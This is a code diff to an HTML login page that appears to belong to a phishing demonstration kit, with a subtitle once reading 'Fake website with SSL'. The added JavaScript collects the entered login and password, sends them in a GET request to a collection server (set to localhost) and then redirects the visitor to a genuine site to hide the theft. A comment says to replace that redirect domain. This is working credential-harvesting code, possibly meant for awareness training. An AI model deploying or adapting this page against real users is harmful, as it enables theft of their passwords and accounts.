@@ -47,8 +47,9 @@
             padding: 10px;
             border: none;
             border-radius: 5px;
-            background-color: #272626;
+            background-color: #2aac2a;
             color: #fafafa;
+            cursor: pointer;
         }
 
         .login-image {
@@ -68,25 +69,58 @@
             background-color: #e1dddd;
         }
     </style>
-    <script>
-        function send_form() {
-            window.location.href = "https://[legitimate.URL.com]/";
-            return false;
-        }
-    </script>
 </head>
 
 <body>
     <div class="login-form">
-        <img class="login-image"
-            src="https://tadeuveiga.com.br/wp-content/uploads/2021/12/certificado-ssl.png" />
-        <p class="sub-title">Fake website with SSL</p>
-        <form action="#" method="get" onsubmit="send_form()">
-            <input type="text" name="login" placeholder="login *" required />
-            <input type="password" name="password" placeholder="password *" required />
-            <button type="submit">Entrar</button>
-        </form>
+        <img class="login-image" src="ssl.png" alt="">
+      <p class="sub-title">Self-signed certificate</p>
+      <form
+        id="myForm"
+        action="https://localhost/"
+        method="GET"
+        onsubmit="send_form(event)"
+      >
+        <input
+          type="text"
+          name="login"
+          placeholder="login"
+          required
+        />
+        <input
+          type="password"
+          name="password"
+          placeholder="password"
+          required
+        />
+          <button type="submit">Submit</button>
+      </form>
+
+      <script>
+        function send_form(event) {
+          event.preventDefault();
+
+          const formData = new URLSearchParams(
+            new FormData(document.getElementById("myForm"))
+          ).toString();
+
+          fetch("https://localhost/?" + formData, {
+            method: "GET",
+          })
+            .then((response) => {
+              if (response.ok) {
+                // Replace the domain below for redirect domain
+                window.location.href = "https://www.google.com";
+              } else {
+                console.error("Erro no envio dos dados");
+              }
+            })
+            .catch((error) => {
+              console.error("Erro ao enviar os dados:", error);
+            });
+        }
+      </script>
     </div>
-</body>
+  </body>
 
 </html>
